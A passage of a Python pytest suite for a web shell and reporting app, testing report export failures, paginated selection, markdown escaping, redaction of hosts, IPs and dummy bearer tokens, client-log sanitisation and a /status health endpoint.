        project = self._create_project(client, session_id, name="Failure Reason")
        raw_error = "renderer leaked secret.example token=abc123"

        with (
            mock.patch(
                "services.reports.jobs.build_report_export_archive",
                side_effect=RuntimeError(raw_error),
            ),
            mock.patch("services.reports.jobs.log.error") as error_log,
        ):
            job_resp = client.post(
                f"/projects/{project['id']}/report/export",
                json={},
                headers={"X-Session-ID": session_id},
            )
            assert job_resp.status_code == 202
            job = json.loads(job_resp.data)["job"]
            deadline = time.time() + 5
            while job["status"] not in {"complete", "failed"} and time.time() < deadline:
                time.sleep(0.02)
                status_resp = client.get(
                    f"/projects/{project['id']}/report/export-jobs/{job['id']}",
                    headers={"X-Session-ID": session_id},
                )
                assert status_resp.status_code == 200
                job = json.loads(status_resp.data)["job"]

        assert job["status"] == "failed"
        assert job["error_status"] == 500
        assert job["error_code"] == "export_failed"
        assert job["error"] == "Report export failed."
        assert raw_error not in json.dumps(job)
        assert error_log.call_args.args == ("REPORT_EXPORT_JOB_FAILED",)
        assert error_log.call_args.kwargs["exc_info"] is True
        error_extra = error_log.call_args.kwargs["extra"]
        assert error_extra["reason"] == "export_failed"
        assert error_extra["exception_type"] == "RuntimeError"
        assert raw_error not in json.dumps(error_extra)

        report_audit_rows = _audit_event_rows(target_id=job["id"], event_type="report.build")
        assert [row["details"]["status"] for row in report_audit_rows] == ["queued", "failed"]
        assert report_audit_rows[-1]["details"]["reason"] == "export_failed"
        assert raw_error not in json.dumps(report_audit_rows[-1]["details"])

    def test_project_report_preview_resolves_manual_selection_beyond_first_page(self):
        client = get_client()
        session_id = self._session_id("project-report-manual-page")
        project = self._create_project(client, session_id, name="Large Manual Selection")
        base_started = datetime(2026, 6, 4, 12, 0, 0, tzinfo=timezone.utc)
        fixture_suffix = uuid.uuid4().hex[:8]
        run_rows = []
        link_rows = []
        finding_rows = []
        excluded_run_id = ""
        selected_run_id = ""
        for index in range(505):
            run_id = f"run_report_page_{fixture_suffix}_{index:03d}"
            if index == 10:
                excluded_run_id = run_id
            if index == 504:
                selected_run_id = run_id
            started = (base_started - timedelta(seconds=index)).isoformat()
            run_rows.append((
                run_id,
                session_id,
                "external",
                "",
                f"echo report page run {index:03d}",
                started,
                "[]",
                0,
            ))
            link_rows.append((
                f"pln_report_page_{fixture_suffix}_{index:03d}",
                project["id"],
                "run",
                run_id,
                "manual",
                started,
            ))
            if index in {0, 10, 504}:
                finding_rows.append((
                    f"fnd_report_page_{fixture_suffix}_{index:03d}",
                    session_id,
                    run_id,
                    "finding",
                    f"Report selector redirect finding {index:03d}",
                    f"https://example.test/redirect/{index:03d}",
                    "medium",
                    f"fp-report-page-{fixture_suffix}-{index:03d}",
                    started,
                ))
        with sqlite3.connect(DB_PATH) as conn:
            conn.executemany(
                "INSERT INTO runs "
                "(id, session_id, run_kind, owner_tab_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                run_rows,
            )
            conn.executemany(
                "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                "VALUES (?, ?, ?, ?, ?, ?)",
                link_rows,
            )
            conn.executemany(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, severity, fingerprint, created) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                finding_rows,
            )
            conn.commit()

        default_payload = client.get(
            f"/projects/{project['id']}/report",
            headers={"X-Session-ID": session_id},
        ).get_json()
        draft = deepcopy(default_payload["report"]["draft"])
        draft["selection"]["run_ids"] = [selected_run_id]
        draft["selection_modes"]["run_ids"] = "manual"
        preview_resp = client.post(
            f"/projects/{project['id']}/report/preview",
            json={"draft": draft},
            headers={"X-Session-ID": session_id},
        )
        assert preview_resp.status_code == 200
        preview_text = preview_resp.get_json()["preview"]["markdown"] + preview_resp.get_json()["preview"]["html"]
        assert "echo report page run 504" in preview_text
        assert "report selection includes an unknown run item" not in preview_text

        finding_draft = deepcopy(default_payload["report"]["draft"])
        finding_draft["selection"]["finding_ids"] = []
        finding_draft["selection_modes"]["finding_ids"] = "all"
        finding_draft["selection_filters"]["finding_ids"] = {"q": "redirect finding 504"}
        finding_preview_resp = client.post(
            f"/projects/{project['id']}/report/preview",
            json={"draft": finding_draft},
            headers={"X-Session-ID": session_id},
        )
        assert finding_preview_resp.status_code == 200
        finding_preview_text = (
            finding_preview_resp.get_json()["preview"]["markdown"]
            + finding_preview_resp.get_json()["preview"]["html"]
        )
        assert "Report selector redirect finding 504" in finding_preview_text
        assert "Report selector redirect finding 000" not in finding_preview_text

        referenced_target = client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "domain", "value": "referenced.example", "source_run_id": selected_run_id},
            headers={"X-Session-ID": session_id},
        ).get_json()["target"]
        selected_target = client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "domain", "value": "selected.example", "source_run_id": selected_run_id},
            headers={"X-Session-ID": session_id},
        ).get_json()["target"]
        referenced_finding_id = f"fnd_report_ref_{fixture_suffix}"
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, target_id, scope, title, raw_line, severity, fingerprint, created) "
                "VALUES (?, ?, ?, ?, 'finding', 'Reference follows finding', ?, 'medium', ?, datetime('now'))",
                (
                    referenced_finding_id,
                    session_id,
                    selected_run_id,
                    referenced_target["id"],
                    "referenced.example returned a finding",
                    f"fp-report-ref-{fixture_suffix}",
                ),
            )
            conn.commit()
        reference_draft = deepcopy(default_payload["report"]["draft"])
        reference_draft["selection"]["target_ids"] = [selected_target["id"]]
        reference_draft["selection_modes"]["target_ids"] = "manual"
        reference_draft["selection"]["finding_ids"] = [referenced_finding_id]
        reference_draft["selection_modes"]["finding_ids"] = "manual"
        reference_draft["export"]["redaction_mode"] = "raw"

        from services.reports.composition import compose_report_context

        reference_context = compose_report_context(
            reference_draft,
            project=project,
            session_id=session_id,
            project_id=project["id"],
        )
        assert [target["id"] for target in reference_context["targets"]] == [selected_target["id"]]
        assert reference_context["findings"][0]["target_references"][0]["target_id"] == referenced_target["id"]
        assert reference_context["findings"][0]["target_references"][0]["value"] == "referenced.example"

        all_draft = deepcopy(default_payload["report"]["draft"])
        all_draft["selection"]["run_ids"] = []
        all_draft["selection_modes"]["run_ids"] = "all"
        all_draft["selection_filters"]["run_ids"] = {"q": "report page run"}
        all_draft["selection_exclude_ids"]["run_ids"] = [excluded_run_id]
        all_preview_resp = client.post(
            f"/projects/{project['id']}/report/preview",
            json={"draft": all_draft},
            headers={"X-Session-ID": session_id},
        )
        assert all_preview_resp.status_code == 200
        all_preview_text = all_preview_resp.get_json()["preview"]["markdown"] + all_preview_resp.get_json()["preview"]["html"]
        assert "echo report page run 000" in all_preview_text
        assert "echo report page run 010" not in all_preview_text
        assert "echo report page run 504" in all_preview_text

        from services.reports.export import build_report_export_archive

        with tempfile.TemporaryDirectory() as tmp:
            archive_result = build_report_export_archive(
                all_draft,
                project=project,
                session_id=session_id,
                project_id=project["id"],
                archive_dir=tmp,
            )
            try:
                with zipfile.ZipFile(archive_result["path"]) as archive:
                    manifest = json.loads(archive.read("manifest.json").decode("utf-8"))
                build = manifest["provenance"]["build"]
                assert build["selection_filters"]["run_ids"] == {"q": "report page run"}
                assert build["selection_exclude_ids"]["run_ids"] == [excluded_run_id]
                assert build["resolved_entity_counts"]["runs"] == 504
            finally:
                try:
                    os.unlink(archive_result["path"])
                except OSError:
                    pass

    def test_project_report_large_non_run_selector_filters_match_api_pages(self, tmp_path):
        client = get_client()
        session_id = self._session_id("project-report-large-non-run")
        project = self._create_project(client, session_id, name="Large Non-Run Selection")
        fixture_suffix = uuid.uuid4().hex[:8]
        base_started = datetime(2026, 6, 4, 13, 0, 0, tzinfo=timezone.utc)
        run_rows = []
        link_rows = []
        target_rows = []
        target_link_rows = []
        finding_rows = []
        artifact_rows = []
        artifact_expected_text: dict[str, str] = {}
        workspace_cfg = {
            "workspace_enabled": True,
            "workspace_root": str(tmp_path / "workspaces"),
        }
        for index in range(60):
            started = (base_started - timedelta(seconds=index)).isoformat()
            run_id = f"run_report_nonrun_{fixture_suffix}_{index:03d}"
            target_id = f"ent_report_nonrun_{fixture_suffix}_{index:03d}"
            target_value = f"selector-target-{fixture_suffix}-{index:03d}.example.test"
            finding_id = f"fnd_report_nonrun_{fixture_suffix}_{index:03d}"
            artifact_id = f"rfa_report_nonrun_{fixture_suffix}_{index:03d}"
            artifact_path = f"reports/selector-artifact-{fixture_suffix}-{index:03d}.txt"
            artifact_text = f"selector artifact body {fixture_suffix} {index:03d}\n"
            run_rows.append((
                run_id,
                session_id,
                "external",
                "",
                f"echo selector seed {fixture_suffix} {index:03d}",
                started,
                "[]",
                0,
            ))
            link_rows.append((
                f"pln_report_nonrun_{fixture_suffix}_{index:03d}",
                project["id"],
                "run",
                run_id,
                "manual",
                started,
            ))
            target_rows.append((
                target_id,
                session_id,
                "domain",
                target_value,
                f"sig-report-nonrun-{fixture_suffix}-{index:03d}",
                started,
                started,
                started,
            ))
            target_link_rows.append((
                f"ple_report_nonrun_{fixture_suffix}_{index:03d}",
                project["id"],
                "atlas_entity",
                target_id,
                "manual",
                started,
            ))
            finding_rows.append((
                finding_id,
                session_id,
                run_id,
                target_id,
                "finding",
                f"Selector backend finding {fixture_suffix} {index:03d}",
                f"selector backend raw finding {fixture_suffix} {index:03d}",
                "medium",
                f"fp-report-nonrun-{fixture_suffix}-{index:03d}",
                started,
            ))
            artifact_rows.append((
                artifact_id,
                session_id,
                run_id,
                artifact_path,
                f"selector-artifact-{fixture_suffix}-{index:03d}.txt",
                "output",
                len(artifact_text.encode("utf-8")),
                "workspace_flag",
                "text/plain",
                "text",
                hashlib.sha256(artifact_text.encode("utf-8")).hexdigest(),
                started,
            ))
            artifact_expected_text[artifact_id] = artifact_text.strip()
            with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
                resolve_workspace_path(session_id, artifact_path, shell_app.CFG, ensure_parent=True).write_text(
                    artifact_text,
                    encoding="utf-8",
                )
        with sqlite3.connect(DB_PATH) as conn:
            conn.executemany(
                "INSERT INTO runs "
                "(id, session_id, run_kind, owner_tab_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                run_rows,
            )
            conn.executemany(
                "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                "VALUES (?, ?, ?, ?, ?, ?)",
                link_rows,
            )
            conn.executemany(
                "INSERT INTO entities "
                "(id, session_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                target_rows,
            )
            conn.executemany(
                "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                "VALUES (?, ?, ?, ?, ?, ?)",
                target_link_rows,
            )
            conn.executemany(
                "INSERT INTO findings "
                "(id, session_id, run_id, target_id, scope, title, raw_line, severity, fingerprint, created) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                finding_rows,
            )
            conn.executemany(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, "
                "content_type, preview_type, content_sha256, created) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                artifact_rows,
            )
            conn.commit()

        default_payload = client.get(
            f"/projects/{project['id']}/report",
            headers={"X-Session-ID": session_id},
        ).get_json()
        selector_cases = [
            {
                "selection_key": "target_ids",
                "context_key": "targets",
                "endpoint": "targets",
                "payload_key": "targets",
                "filters": {"q": f"selector-target-{fixture_suffix}", "type": "domain"},
                "query": {"q": f"selector-target-{fixture_suffix}", "type": "domain"},
                "label": lambda item: str(item.get("value") or ""),
            },
            {
                "selection_key": "finding_ids",
                "context_key": "findings",
                "endpoint": "findings",
                "payload_key": "findings",
                "filters": {
                    "q": f"Selector backend finding {fixture_suffix}",
                    "review_state": "new",
                    "severity": "medium",
                },
                "query": {
                    "q": f"Selector backend finding {fixture_suffix}",
                    "review_state": "new",
                    "severity": "medium",
                    "orphan_filter": "all",
                    "include_group_counts": "0",
                },
                "label": lambda item: str(item.get("title") or ""),
            },
            {
                "selection_key": "artifact_ids",
                "context_key": "artifacts",
                "endpoint": "artifacts",
                "payload_key": "artifacts",
                "filters": {"q": f"selector-artifact-{fixture_suffix}"},
                "query": {"q": f"selector-artifact-{fixture_suffix}"},
                "label": lambda item: artifact_expected_text[str(item.get("id") or "")],
            },
        ]

        from services.reports.composition import compose_report_context
        from services.reports.export import build_report_export_archive

        for case in selector_cases:
            page_query = urlencode({"limit": 50, "offset": 0, **case["query"]}, doseq=True)
            page_resp = client.get(
                f"/projects/{project['id']}/{case['endpoint']}?{page_query}",
                headers={"X-Session-ID": session_id},
            )
            assert page_resp.status_code == 200
            page_rows = page_resp.get_json()[case["payload_key"]]
            assert len(page_rows) == 50
            page_two_query = urlencode({"limit": 50, "offset": 50, **case["query"]}, doseq=True)
            page_two_resp = client.get(
                f"/projects/{project['id']}/{case['endpoint']}?{page_two_query}",
                headers={"X-Session-ID": session_id},
            )
            assert page_two_resp.status_code == 200
            page_two_rows = page_two_resp.get_json()[case["payload_key"]]
            assert len(page_two_rows) == 10
            excluded_id = page_two_rows[0]["id"]
            included_label = case["label"](page_rows[0])
            excluded_label = case["label"](page_two_rows[0])
            draft = deepcopy(default_payload["report"]["draft"])
            draft["export"]["redaction_mode"] = "raw"
            for selection_key in ("run_ids", "target_ids", "finding_ids", "artifact_ids"):
                draft["selection"][selection_key] = []
                draft["selection_modes"][selection_key] = "manual"
                draft["selection_filters"][selection_key] = {}
                draft["selection_exclude_ids"][selection_key] = []
            draft["selection"][case["selection_key"]] = []
            draft["selection_modes"][case["selection_key"]] = "all"
            draft["selection_filters"][case["selection_key"]] = case["filters"]
            draft["selection_exclude_ids"][case["selection_key"]] = [excluded_id]

            with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
                context = compose_report_context(
                    draft,
                    project=project,
                    session_id=session_id,
                    project_id=project["id"],
                    cfg=shell_app.CFG,
                )
                preview_resp = client.post(
                    f"/projects/{project['id']}/report/preview",
                    json={"draft": draft},
                    headers={"X-Session-ID": session_id},
                )
            assert preview_resp.status_code == 200
            context_ids = [item["id"] for item in context[case["context_key"]]]
            assert [item["id"] for item in page_rows] == context_ids[:50]
            assert excluded_id not in context_ids
            assert len(context_ids) == 59
            assert context["selection_totals"][case["context_key"]] == 60
            preview = preview_resp.get_json()["preview"]
            preview_text = preview["markdown"] + preview["html"]
            assert included_label in preview_text
            assert excluded_label not in preview_text

            with tempfile.TemporaryDirectory() as tmp:
                with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
                    archive_result = build_report_export_archive(
                        draft,
                        project=project,
                        session_id=session_id,
                        project_id=project["id"],
                        cfg=shell_app.CFG,
                        archive_dir=tmp,
                    )
                try:
                    with zipfile.ZipFile(archive_result["path"]) as archive:
                        manifest = json.loads(archive.read("manifest.json").decode("utf-8"))
                        archive_text = (
                            archive.read("report.md").decode("utf-8")
                            + archive.read("report.html").decode("utf-8")
                        )
                finally:
                    try:
                        os.unlink(archive_result["path"])
                    except OSError:
                        pass
            build = manifest["provenance"]["build"]
            for filter_key, filter_value in case["filters"].items():
                assert build["selection_filters"][case["selection_key"]][filter_key] == filter_value
            assert build["selection_exclude_ids"][case["selection_key"]] == [excluded_id]
            assert build["resolved_entity_counts"][case["context_key"]] == 59
            assert included_label in archive_text
            assert excluded_label not in archive_text

    def test_project_report_markdown_escapes_table_cells(self):
        client = get_client()
        session_id = self._session_id("project-report-markdown-table")
        project = self._create_project(client, session_id, name="Markdown Table")
        run_id = self._seed_run(session_id, r"printf 'left|right' C:\temp")
        self._link_run(client, session_id, project["id"], run_id)

        default_payload = client.get(
            f"/projects/{project['id']}/report",
            headers={"X-Session-ID": session_id},
        ).get_json()
        draft = default_payload["report"]["draft"]
        draft["selection"]["run_ids"] = [run_id]
        draft["selection_modes"]["run_ids"] = "manual"
        preview_resp = client.post(
            f"/projects/{project['id']}/report/preview",
            json={"draft": draft},
            headers={"X-Session-ID": session_id},
        )
        assert preview_resp.status_code == 200
        markdown = preview_resp.get_json()["preview"]["markdown"]
        assert r"printf 'left\|right' C:\\temp" in markdown
        assert r"printf 'left|right' C:\temp" not in markdown

    def test_project_report_preview_composes_redacted_project_content(self, tmp_path):
        client = get_client()
        session_id = self._session_id("project-report-redacted")
        project = self._create_project(client, session_id, name="secret.darklab.sh")
        run_id = self._seed_run(
            session_id,
            "curl https://secret.darklab.sh -H 'Authorization: Bearer abc123'",
        )
        self._link_run(client, session_id, project["id"], run_id)
        target_resp = client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "domain", "value": "secret.darklab.sh", "source_run_id": run_id},
            headers={"X-Session-ID": session_id},
        )
        assert target_resp.status_code == 201
        target_id = target_resp.get_json()["target"]["id"]
        finding_id = f"fnd_{run_id}"
        artifact_id = f"rfa_{run_id}"
        artifact_body = b"Authorization: Bearer abc123 from https://secret.darklab.sh at 192.168.1.5\n"
        workspace_cfg = {
            "workspace_enabled": True,
            "workspace_root": str(tmp_path / "workspaces"),
        }
        with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
            artifact_path = resolve_workspace_path(session_id, "reports/secrets.txt", shell_app.CFG, ensure_parent=True)
            artifact_path.write_bytes(artifact_body)
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, target_id, scope, title, severity, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, ?, 'finding', 'token leak', 'high', ?, 0, ?, datetime('now'))",
                (
                    finding_id,
                    session_id,
                    run_id,
                    target_id,
                    "Authorization: Bearer abc123 from secret.darklab.sh",
                    f"fp-{run_id}",
                ),
            )
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, "
                "content_type, preview_type, content_sha256, created) "
                "VALUES (?, ?, ?, 'reports/secrets.txt', 'secrets.txt', 'output', ?, "
                "'workspace_flag', 'text/plain', 'text', ?, datetime('now'))",
                (artifact_id, session_id, run_id, len(artifact_body), hashlib.sha256(artifact_body).hexdigest()),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'finding', ?, 'Finding private note should stay out', datetime('now'), datetime('now'))",
                (f"note_fnd_{run_id}", session_id, finding_id),
            )
            conn.commit()
        triage_resp = client.put(
            f"/findings/{finding_id}/triage",
            json={
                "remediation": "Patch https://secret.darklab.sh before 192.168.1.5 leaks tokens.",
                "verification_steps": "Re-run curl against secret.darklab.sh from 192.168.1.5.",
                "verification_status": "ready_to_verify",
                "verification_notes": "Internal verification note should stay out.",
            },
            headers={"X-Session-ID": session_id},
        )
        assert triage_resp.status_code == 200

        default_payload = client.get(
            f"/projects/{project['id']}/report",
            headers={"X-Session-ID": session_id},
        ).get_json()
        draft = default_payload["report"]["draft"]
        draft["metadata"]["engagement_name"] = "Sensitive Readout"
        draft["metadata"]["executive_summary"] = "Public-safe summary."
        draft["metadata"]["methodology"] = "Reviewed linked runs and evidence."
        draft["export"]["redaction_mode"] = "redacted"
        draft["selection"] = {
            "run_ids": [run_id],
            "target_ids": [target_id],
            "finding_ids": [finding_id],
            "artifact_ids": [artifact_id],
            "entity_ids": [],
        }
        with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
            preview_resp = client.post(
                f"/projects/{project['id']}/report/preview",
                json={"draft": draft},
                headers={"X-Session-ID": session_id},
            )
        assert preview_resp.status_code == 200
        preview = preview_resp.get_json()["preview"]
        report_text = preview["markdown"] + preview["html"]
        assert "Sensitive Readout" in report_text
        assert "Public-safe summary." in report_text
        assert "High (1)" in report_text
        assert "[host-redacted]" in report_text
        assert "[ip-redacted]" in report_text
        assert "domain: [host-redacted]" not in report_text
        assert target_id in report_text
        assert "Patch https://[host-redacted]" in report_text
        assert "Authorization: Bearer [redacted]" in report_text
        assert "secret.darklab.sh" not in report_text
        assert "192.168.1.5" not in report_text
        assert "Bearer abc123" not in report_text
        assert "Internal verification note" not in report_text
        assert "Finding private note" not in report_text

        draft["export"]["redaction_mode"] = "raw"
        with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
            raw_preview_resp = client.post(
                f"/projects/{project['id']}/report/preview",
                json={"draft": draft},
                headers={"X-Session-ID": session_id},
            )
        assert raw_preview_resp.status_code == 200
        raw_preview = raw_preview_resp.get_json()["preview"]
        raw_report_text = raw_preview["markdown"] + raw_preview["html"]
        assert "domain: secret.darklab.sh" in raw_report_text
        assert "secret.darklab.sh" in raw_report_text
        assert "192.168.1.5" in raw_report_text
        assert "Bearer abc123" in raw_report_text
        assert "[host-redacted]" not in raw_report_text
        assert "[ip-redacted]" not in raw_report_text

    def test_project_artifacts_are_explicitly_disabled_when_files_are_disabled(self):
        client = get_client()
        session_id = self._session_id("project-files-off")
        project = self._create_project(client, session_id)
        run_id = self._seed_run(session_id, "nuclei -u https://darklab.sh")
        self._link_run(client, session_id, project["id"], run_id)
        artifact_id = "rfa_" + uuid.uuid4().hex[:16]
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                "VALUES (?, ?, ?, 'reports/nuclei.json', 'nuclei.json', 'output', 42, "
                "'workspace_flag', datetime('now'))",
                (artifact_id, session_id, run_id),
            )
            conn.commit()

        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": False}, clear=False):
            summary_resp = client.get(
                f"/projects/{project['id']}/summary",
                headers={"X-Session-ID": session_id},
            )
            artifacts_resp = client.get(
                f"/projects/{project['id']}/artifacts?limit=10&offset=0",
                headers={"X-Session-ID": session_id},
            )
            assert summary_resp.status_code == 200
            assert json.loads(summary_resp.data)["artifacts"] == []
            assert artifacts_resp.status_code == 200
            artifact = json.loads(artifacts_resp.data)["artifacts"][0]
            assert artifact["file_status"] == "disabled"
            assert artifact["file_available"] is False
            assert artifact["file_status_detail"] == "Files are disabled on this instance"

            preview_resp = client.get(
                f"/projects/{project['id']}/artifacts/{artifact_id}/preview",
                headers={"X-Session-ID": session_id},
            )
            download_resp = client.get(
                f"/projects/{project['id']}/artifacts/{artifact_id}/download",
                headers={"X-Session-ID": session_id},
            )
            package_resp = client.post(
                f"/projects/{project['id']}/packages",
                json={
                    "name": "Transcript Only",
                    "include_artifacts": True,
                    "selection": {"run_ids": [run_id], "artifact_ids": [artifact_id]},
                },
                headers={"X-Session-ID": session_id},
            )

        assert preview_resp.status_code == 403
        assert json.loads(preview_resp.data)["error"] == "Files are disabled on this instance"
        assert download_resp.status_code == 403
        assert json.loads(download_resp.data)["error"] == "Files are disabled on this instance"
        assert package_resp.status_code == 201
        package = json.loads(package_resp.data)["package"]
        assert package["include_artifacts"] is False
        assert package["manifest"]["include_artifacts"] is False
        assert package["manifest"]["options"]["raw_artifacts"] is False
        assert package["manifest"]["artifacts"][0]["file_status"] == "disabled"

    def test_rejects_cross_session_or_unsupported_project_links(self):
        client = get_client()
        session_id = self._session_id("project-link")
        other_session = self._session_id("project-other")
        project = self._create_project(client, session_id)
        other_run_id = "run-" + uuid.uuid4().hex
        builtin_run_id = "run-" + uuid.uuid4().hex

        def project_link_post(payload):
            return client.post(
                f"/projects/{project['id']}/links",
                json=payload,
                headers={"X-Session-ID": session_id},
            )

        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
                (other_run_id, other_session, "dig darklab.sh"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, run_kind, command, started) "
                "VALUES (?, ?, 'builtin', ?, datetime('now'))",
                (builtin_run_id, session_id, "project list"),
            )
            conn.execute(
                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, datetime('now'), ?)",
                (f"{session_id}-snapshot", session_id, "snapshot", "[]"),
            )
            conn.commit()

        cross_session = project_link_post({"entity_type": "run", "entity_id": other_run_id})
        builtin_link = project_link_post({"entity_type": "run", "entity_id": builtin_run_id})
        unsupported = project_link_post({"entity_type": "note", "entity_id": "note_1"})
        run_scoped = project_link_post({"entity_type": "run_file_artifact", "entity_id": "rfa_1"})
        snapshot_link = project_link_post({"entity_type": "snapshot", "entity_id": f"{session_id}-snapshot"})
        workspace_file_link = project_link_post({"entity_type": "workspace_file", "entity_id": "reports/notes.txt"})

        assert cross_session.status_code == 404
        assert "not found" in json.loads(cross_session.data)["error"]
        assert builtin_link.status_code == 400
        assert "external runs" in json.loads(builtin_link.data)["error"]
        assert unsupported.status_code == 400
        assert "Unsupported project entity type" in json.loads(unsupported.data)["error"]
        assert run_scoped.status_code == 400
        assert "do not support" in json.loads(run_scoped.data)["error"]
        assert snapshot_link.status_code == 400
        assert "do not support" in json.loads(snapshot_link.data)["error"]
        assert workspace_file_link.status_code == 400
        assert "do not support" in json.loads(workspace_file_link.data)["error"]


# ── /log ──────────────────────────────────────────────────────────────────────

class TestClientLogRoute:
    def test_accepts_client_error_payload(self):
        client = get_client()
        with mock.patch.object(shell_assets.log, "warning") as mock_warning:
            resp = client.post("/log", json={
                "context": "session-token set",
                "message": "ReferenceError: global is not defined",
                "details": {
                    "selection_key": "run_ids",
                    "offset": 50,
                    "filter_fields": ["q"],
                    "filter_active": {"q": True},
                    "q": "sensitive search text",
                },
            })
        assert resp.status_code == 200
        assert resp.get_json() == {"ok": True}
        mock_warning.assert_called_once()
        assert mock_warning.call_args[0][0] == "CLIENT_ERROR"
        extra = mock_warning.call_args.kwargs["extra"]
        assert extra["context"] == "session-token set"
        assert extra["client_message"] == "ReferenceError: global is not defined"
        assert extra["client_details"] == {
            "selection_key": "run_ids",
            "offset": 50,
            "filter_fields": ["q"],
            "filter_active": {"q": True},
        }
        assert "sensitive search text" not in json.dumps(extra)

        with mock.patch.object(shell_assets.log, "debug") as mock_debug:
            debug_resp = client.post("/log", json={
                "event": "TEAM_SCOPE_CHANGED",
                "level": "debug",
                "context": "TEAM_SCOPE_CHANGED",
                "message": '{"scope":"team"}',
            })
        assert debug_resp.status_code == 200
        mock_debug.assert_called_once()
        assert mock_debug.call_args[0][0] == "TEAM_SCOPE_CHANGED"
        debug_extra = mock_debug.call_args.kwargs["extra"]
        assert debug_extra["context"] == "TEAM_SCOPE_CHANGED"
        assert debug_extra["client_message"] == '{"scope":"team"}'

    def test_accepts_safe_asset_failure_context_without_query_values(self):
        client = get_client()
        with mock.patch.object(shell_assets.log, "error") as mock_error:
            resp = client.post("/log", json={
                "event": "ESM_BOOTSTRAP_LOAD_FAILED",
                "level": "error",
                "context": "ESM_BOOTSTRAP_LOAD_FAILED",
                "message": "failed to load module",
                "details": {
                    "page": "index",
                    "bundle": "shell-bootstrap",
                    "src": "http://localhost/static/build/shell-bootstrap.123456789abc.js?v=abc123&token=secret",
                    "phase": "load",
                    "asset_name": "shell-bootstrap",
                    "asset_type": "module",
                    "expected_global": True,
                },
            })
        assert resp.status_code == 200
        mock_error.assert_called_once()
        assert mock_error.call_args[0][0] == "ESM_BOOTSTRAP_LOAD_FAILED"
        extra = mock_error.call_args.kwargs["extra"]
        assert extra["client_details"] == {
            "asset_name": "shell-bootstrap",
            "asset_type": "module",
            "bundle": "shell-bootstrap",
            "page": "index",
            "phase": "load",
            "src": "/static/build/shell-bootstrap.123456789abc.js?v=abc123",
            "expected_global": True,
        }
        assert "secret" not in json.dumps(extra)


# ── /status ───────────────────────────────────────────────────────────────────

class TestStatusRoute:
    def test_returns_200_even_when_db_fails(self):
        # /status is for live HUD polling; it must never return 503 so a
        # blip doesn't tear down the UI. Fields report state instead.
        client = get_client()
        with mock.patch("blueprints.assets.db_connect", side_effect=Exception("db error")):
            resp = client.get("/status")
        assert resp.status_code == 200

    def test_response_contains_expected_keys(self):
        client = get_client()
        data = json.loads(client.get("/status").data)
        for key in ("uptime", "db", "redis", "server_time"):
            assert key in data

    def test_uptime_is_non_negative_integer(self):
        client = get_client()
        data = json.loads(client.get("/status").data)
        assert isinstance(data["uptime"], int)
        assert data["uptime"] >= 0

    def test_db_ok_when_sqlite_available(self):
        client = get_client()
        data = json.loads(client.get("/status").data)
        assert data["db"] == "ok"

    def test_status_runs_periodic_audit_retention_when_db_available(self):
        client = get_client()
        with mock.patch("blueprints.assets.maybe_prune_events", return_value=0) as prune:
            data = json.loads(client.get("/status").data)
        assert data["db"] == "ok"
        prune.assert_called_once()

    def test_status_keeps_db_ok_when_periodic_audit_retention_fails(self):
        client = get_client()
        with mock.patch(
            "blueprints.assets.maybe_prune_events",
            side_effect=RuntimeError("retention failed"),
        ), mock.patch.object(shell_assets.log, "warning") as warning:
            data = json.loads(client.get("/status").data)
        assert data["db"] == "ok"
        warning.assert_called_once()
        assert warning.call_args.args == ("AUDIT_RETENTION_PERIODIC_PRUNE_FAILED",)

    def test_db_down_when_sqlite_fails(self):
        client = get_client()
        with mock.patch("blueprints.assets.db_connect", side_effect=Exception("db error")):
            data = json.loads(client.get("/status").data)
        assert data["db"] == "down"

    def test_redis_none_when_not_configured(self):
        # In the test environment there is no Redis configured.
        client = get_client()
        data = json.loads(client.get("/status").data)
        assert data["redis"] == "none"

    def test_redis_ok_when_ping_succeeds(self):
        client = get_client()
        fake_redis = mock.MagicMock()
        fake_redis.ping.return_value = True
        with mock.patch("blueprints.assets.redis_client", fake_redis):
            data = json.loads(client.get("/status").data)
        assert data["redis"] == "ok"

    def test_redis_down_when_ping_fails(self):
        client = get_client()
        fake_redis = mock.MagicMock()
        fake_redis.ping.side_effect = Exception("redis down")
        with mock.patch("blueprints.assets.redis_client", fake_redis):
